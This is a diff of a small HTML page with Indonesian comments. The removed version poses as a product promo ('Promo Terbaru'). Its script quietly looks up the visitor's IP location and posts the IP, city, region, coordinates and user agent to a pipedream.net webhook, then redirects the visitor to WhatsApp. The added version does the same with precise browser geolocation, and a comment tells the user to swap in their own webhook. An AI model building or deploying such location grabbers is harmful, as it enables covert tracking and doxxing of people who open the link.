@@ -1,32 +1,36 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Promo Terbaru</title>
-  </head>
-  <body>
-    <h2>Tunggu sebentar, sedang memuat info produk...</h2>
+<head>
+  <title>Geo Test</title>
+</head>
+<body>
+  <h1>Checking location…</h1>
 
-    <script>
-      fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(data => {
-          fetch("https://eoi1qxm9cxsp15h.m.pipedream.net", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              ip: data.ip,
-              city: data.city,
-              region: data.region,
-              country: data.country,
-              latlon: data.latitude + "," + data.longitude,
-              useragent: navigator.userAgent
-            })
-          }).then(() => {
-            // Setelah ngirim, redirect ke link target (misal YouTube/WA)
-            window.location.href = "https://wa.me/62xxxx?text=Halo%20bos";
-          });
+<script>
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(ipData => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const data = {
+          ip: ipData.ip,
+          location: {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          },
+          ua: navigator.userAgent
+        };
+
+        // GANTI URL DI BAWAH DENGAN WEBHOOK LO
+        fetch("https://eoi1qxm9cxsp15h.m.pipedream.net", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(data)
         });
-    </script>
-  </body>
+
+        document.body.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
+      });
+    });
+</script>
+</body>
 </html>
